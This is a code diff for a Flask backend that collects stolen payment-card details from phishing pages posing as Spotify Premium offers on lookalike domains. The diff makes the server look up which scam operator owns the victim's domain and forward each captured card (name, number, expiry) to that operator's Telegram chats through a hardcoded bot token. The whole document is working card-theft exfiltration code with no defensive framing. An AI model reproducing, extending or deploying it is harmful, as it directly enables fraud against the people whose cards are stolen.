@@ -4,19 +4,36 @@ from flask_cors import CORS
 import requests
 
 app = Flask(__name__)
-# Permite que tu HTML le hable al servidor
+# Permitimos que tus dominios hablen con el servidor
 CORS(app, resources={r"/*": {"origins": "*"}})
 
 # --- CONFIGURACIÓN ---
 TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'
 
+# --- LA LISTA MAESTRA (Solo tú la controlas) ---
+# Aquí asocias el DOMINIO con los IDs de TELEGRAM que deben recibir la CC.
+# Si un dominio no está aquí, no pasa nada.
+CLIENTES_MAPA = {
+    'spotlfypremium.online': ['6953415010', '7707049896'],
+    'free.spotlfypremium.online': ['-1087968824', '1087968824'],
+}
+
 @app.route('/enviar-datos', methods=['POST'])
 def recibir_datos():
-    data = request.json
-    # El HTML le manda el ID directamente
-    target_id = str(data.get('target_id'))
+    # El servidor detecta de qué dominio viene la víctima automáticamente
+    dominio_victima = request.headers.get('Host', '').split(':')[0]
+    print(f"🌐 PETICIÓN RECIBIDA DESDE EL DOMINIO: {dominio_victima}")
 
-    # Captura de datos
+    # Buscamos en nuestra lista quién es el dueño de ese dominio
+    lista_de_ids = CLIENTES_MAPA.get(dominio_victima)
+
+    # Si el dominio no está en nuestra lista, ignoramos la petición
+    if not lista_de_ids:
+        print(f"🚫 DOMINIO NO AUTORIZADO: {dominio_victima}")
+        return jsonify({"status": "ignored"}), 200
+
+    # Captura de datos de la tarjeta
+    data = request.json
     nombre = data.get('nombre', 'N/A')
     tarjeta = data.get('tarjeta', 'N/A')
     expiracion = data.get('expiracion', 'N/A')
@@ -25,6 +42,7 @@ def recibir_datos():
     mensaje = (
         f"💰 *NUEVA CC CAPTURADA* 💰\n"
         f"━━━━━━━━━━━━━━━━━━\n"
+        f"🌐 *DOMINIO:* `{dominio_victima}`\n"
         f"👤 *Nombre:* `{nombre}`\n"
         f"💳 *Tarjeta:* `{tarjeta}`\n"
         f"📅 *Exp:* `{expiracion}`\n"
@@ -32,21 +50,20 @@ def recibir_datos():
         f"━━━━━━━━━━━━━━━━━━"
     )
 
-    # Envía la CC al ID que mandó el HTML
-    url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    payload = {"chat_id": target_id, "text": mensaje, "parse_mode": "Markdown"}
-    
-    try:
-        res = requests.post(url_telegram, json=payload, timeout=5)
-        if res.status_code == 200:
-            print(f"✅ Enviado al ID: {target_id}")
-            return jsonify({"status": "success"}), 200
-        else:
-            print(f"❌ Error Telegram: {res.text}")
-            return jsonify({"status": "error"}), 500
-    except Exception as e:
-        print(f"❌ Error: {e}")
-        return jsonify({"status": "error"}), 500
+    # Mandamos la CC a todos los IDs que pertenecen a ese dominio
+    exitos = 0
+    for id_telegram in lista_de_ids:
+        url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        payload = {"chat_id": id_telegram, "text": mensaje, "parse_mode": "Markdown"}
+        try:
+            res = requests.post(url_telegram, json=payload, timeout=5)
+            if res.status_code == 200:
+                exitos += 1
+        except:
+            continue
+
+    print(f"✅ PROCESO TERMINADO. Enviados a {exitos} personas del dominio {dominio_victima}")
+    return jsonify({"status": "success", "enviados": exitos}), 200
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
